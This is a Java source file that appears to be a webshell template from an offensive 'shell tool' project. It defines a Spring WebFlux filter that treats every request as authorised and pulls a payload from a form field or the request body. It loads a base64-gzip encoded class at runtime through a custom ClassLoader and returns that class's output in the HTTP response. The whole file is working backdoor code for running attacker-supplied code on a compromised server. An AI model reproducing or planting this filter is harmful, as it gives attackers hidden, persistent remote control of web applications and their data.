package com.reajason.noone.core.shelltool;

import org.springframework.core.io.buffer.DataBuffer;
import org.springframework.core.io.buffer.DataBufferUtils;
import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.http.server.reactive.ServerHttpResponse;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import reactor.core.publisher.Mono;
import reactor.core.scheduler.Schedulers;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 */
public class NoOneWebFilter extends ClassLoader implements WebFilter {
    private static Class<?> coreClass = null;
    private static String coreGzipBase64;
    private static String paramName;
    private static int prefix;
    private static int suffix;

    public NoOneWebFilter() {
    }

    public NoOneWebFilter(ClassLoader parent) {
        super(parent);
    }

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        ServerHttpRequest request = exchange.getRequest();
        if (!isAuthed(request)) {
            return chain.filter(exchange);
        }

        ServerHttpResponse response = exchange.getResponse();
        return getArgFromRequest(exchange)
                .switchIfEmpty(Mono.just(new byte[0]))
                .map(this::transformReqPayload)
                .flatMap(payload -> Mono.fromCallable(() -> executeCore(payload, response))
                        .subscribeOn(Schedulers.boundedElastic()))
                .flatMap(buffer -> response.writeWith(Mono.just(buffer)))
                .onErrorResume(e -> {
                    e.printStackTrace();
                    return chain.filter(exchange);
                });
    }

    private boolean isAuthed(ServerHttpRequest request) {
        return true;
    }

    private Mono<byte[]> getArgFromRequest(ServerWebExchange exchange) {
        if (paramName != null) {
            return exchange.getFormData()
                    .flatMap(formData -> Mono.fromCallable(() -> {
                        String payload = formData.getFirst(paramName);
                        return payload.substring(prefix, payload.length() - suffix).getBytes(StandardCharsets.UTF_8);
                    }))
                    .switchIfEmpty(Mono.just(new byte[0]))
                    .onErrorReturn(new byte[0]);
        }
        return DataBufferUtils.join(exchange.getRequest().getBody())
                .map(joined -> {
                    try {
                        byte[] body = new byte[joined.readableByteCount()];
                        joined.read(body);
                        int len = body.length - prefix - suffix;
                        byte[] result = new byte[len];
                        System.arraycopy(body, prefix, result, 0, len);
                        return result;
                    } finally {
                        DataBufferUtils.release(joined);
                    }
                })
                .switchIfEmpty(Mono.just(new byte[0]))
                .onErrorReturn(new byte[0]);
    }

    private byte[] transformReqPayload(byte[] input) {
        return input;
    }

    private byte[] wrapResData(byte[] payload) {
        return payload;
    }

    private byte[] transformResData(byte[] payload) {
        return payload;
    }

    private void wrapResponse(ServerHttpResponse response) {
    }

    private DataBuffer executeCore(byte[] payload, ServerHttpResponse response) throws Exception {
        if (coreClass == null) {
            byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
            coreClass = new NoOneWebFilter(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
        }
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        Object httpChannelCore = coreClass.getConstructor(Object.class).newInstance(this);
        httpChannelCore.equals(new Object[]{payload, outputStream});
        httpChannelCore.toString();
        wrapResponse(response);
        byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
        return response.bufferFactory().wrap(data);
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Throwable e) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }
}
